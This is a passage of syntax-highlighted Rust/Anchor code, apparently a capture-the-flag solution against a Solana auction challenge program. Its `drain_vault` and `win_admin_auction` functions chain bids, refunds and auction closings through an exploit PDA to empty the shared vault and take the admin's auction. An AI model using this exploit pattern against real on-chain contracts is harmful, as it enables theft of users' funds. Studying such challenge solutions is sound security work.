class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">CreateAuction</span> <span class="token punctuation">&#123;</span>            auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">create_auction</span><span class="token punctuation">(</span>        cpi_create<span class="token punctuation">,</span>        <span class="token number">999</span><span class="token punctuation">,</span>        <span class="token string">"seed"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        end_time<span class="token punctuation">,</span>        settlement_deadline<span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> cpi_bid_player <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>            bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_player<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> cpi_bid_exploit <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new_with_signer</span><span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>            bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        signer<span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_exploit<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> cpi_refund_player <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">ClaimRefund</span> <span class="token punctuation">&#123;</span>            bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">claim_refund</span><span class="token punctuation">(</span>cpi_refund_player<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> cpi_winner <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new_with_signer</span><span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">ClaimWinner</span> <span class="token punctuation">&#123;</span>            winner<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        signer<span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">claim_winner</span><span class="token punctuation">(</span>cpi_winner<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> cpi_close <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">CloseAuction</span> <span class="token punctuation">&#123;</span>            auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">close_auction</span><span class="token punctuation">(</span>cpi_close<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[inline(never)]</span><span class="token keyword">fn</span> <span class="token function-definition function">drain_vault</span><span class="token punctuation">(</span>    ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">,</span>    bump<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">,</span>    rounds<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    starting_bid<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    buy_now<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> exploit_seeds <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span>bump<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> signer <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>exploit_seeds<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>rounds <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token punctuation">(</span>end_time<span class="token punctuation">,</span> settlement_deadline<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">auction_times</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> cpi_create <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">CreateAuction</span> <span class="token punctuation">&#123;</span>                auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">create_auction</span><span class="token punctuation">(</span>            cpi_create<span class="token punctuation">,</span>            <span class="token number">999</span><span class="token punctuation">,</span>            <span class="token string">"drain"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            buy_now<span class="token punctuation">,</span>            starting_bid<span class="token punctuation">,</span>            <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">,</span>            end_time<span class="token punctuation">,</span>            settlement_deadline<span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> cpi_bid_player <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>                bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_player<span class="token punctuation">,</span> starting_bid<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> cpi_bid_exploit <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new_with_signer</span><span class="token punctuation">(</span>            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>                bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            signer<span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_exploit<span class="token punctuation">,</span> buy_now<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> cpi_refund_player <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">ClaimRefund</span> <span class="token punctuation">&#123;</span>                bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">claim_refund</span><span class="token punctuation">(</span>cpi_refund_player<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> cpi_close <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">CloseAuction</span> <span class="token punctuation">&#123;</span>                auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">close_auction</span><span class="token punctuation">(</span>cpi_close<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[inline(never)]</span><span class="token keyword">fn</span> <span class="token function-definition function">win_admin_auction</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> cpi_bid_final <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>            bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_final<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> cpi_winner <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">ClaimWinner</span> <span class="token punctuation">&#123;</span>            winner<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">claim_winner</span><span class="token punctuation">(</span>cpi_winner<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[inline(never)]</span><span class="token keyword">fn</span> <span class="token function-definition function">auction_times</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">i64</span><span class="token punctuation">,</span> <span class="token keyword">i64</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> now <span class="token operator">=</span> <span class="token class-name">Clock</span><span class="token punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span>unix_timestamp<span class="token punctuation">;</span>    <span class="token keyword">let</span> end_time <span class="token operator">=</span> now <span class="token operator">+</span> <span class="token number">1000</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> settlement_deadline <span class="token operator">=</span> end_time <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span>end_time<span class="token 